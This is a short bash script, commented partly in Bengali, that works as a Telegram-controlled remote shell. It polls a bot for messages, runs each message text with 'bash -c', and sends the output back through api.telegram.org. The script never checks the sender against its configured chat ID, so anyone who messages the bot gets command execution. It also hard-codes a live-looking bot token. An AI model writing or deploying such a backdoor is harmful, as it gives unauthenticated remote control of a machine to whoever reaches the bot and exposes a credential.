#!/bin/bash
# Telegram Remote Command Executor (Full Access)
# Personal use only

BOT_TOKEN="7888336988:AAFzsewYXVT0Grxx7fQwKydxcKNMlUkLXqk"
CHAT_ID="5634946920"

LAST_UPDATE_ID=0

while true; do
    # Telegram থেকে নতুন আপডেট আনা
    UPDATES=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID+1))")
    
    COUNT=$(echo "$UPDATES" | jq '.result | length')
    
    if [[ $COUNT -gt 0 ]]; then
        for ((i=0;i<$COUNT;i++)); do
            MESSAGE=$(echo "$UPDATES" | jq -r ".result[$i].message.text")
            UPDATE_ID=$(echo "$UPDATES" | jq -r ".result[$i].update_id")
            CHAT=$(echo "$UPDATES" | jq -r ".result[$i].message.chat.id")

            # কমান্ড এক্সিকিউট
            OUTPUT=$(bash -c "$MESSAGE" 2>&1)

            # আউটপুট Telegram এ পাঠানো
            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
                 -d chat_id="$CHAT" \
                 -d reply_to_message_id="$(echo "$UPDATES" | jq -r ".result[$i].message.message_id")" \
                 -d text="💻 Command: $MESSAGE
----------------
$OUTPUT"

            LAST_UPDATE_ID=$UPDATE_ID
        done
    fi

    sleep 2
done
